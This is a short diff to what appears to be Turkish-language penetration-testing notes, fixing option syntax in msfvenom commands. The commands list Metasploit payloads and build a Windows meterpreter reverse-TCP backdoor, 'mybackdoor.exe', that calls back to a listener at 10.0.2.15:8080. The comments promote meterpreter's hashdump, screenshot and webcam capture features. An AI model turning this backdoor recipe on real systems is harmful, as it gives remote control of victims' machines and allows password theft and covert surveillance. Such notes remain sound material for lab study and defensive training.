@@ -16,6 +16,6 @@
 
 > msfvenom --list payloads //Metasploit Framework içindeki kullanılabilir tüm payload’ları listelemek için kullanılır.
 
-> msfvenom -payload windows/meterpreter/reverse_tcp -list options // ayarlar çıkar, zorunlu olanlar değiştirilir , meterpreter kullanma sebebi çok güçlü post-exploitation özellikleri var.hashdump,screenshot,webcam_snap.. -tcp http https denenir. hangisi olursa
+> msfvenom -payload windows/meterpreter/reverse_tcp --list options // ayarlar çıkar, zorunlu olanlar değiştirilir , meterpreter kullanma sebebi çok güçlü post-exploitation özellikleri var.hashdump,screenshot,webcam_snap.. -tcp http https denenir. hangisi olursa
 
-> msfvenom -payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 -format exe -out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe
+> msfvenom -payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 --format exe --out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe
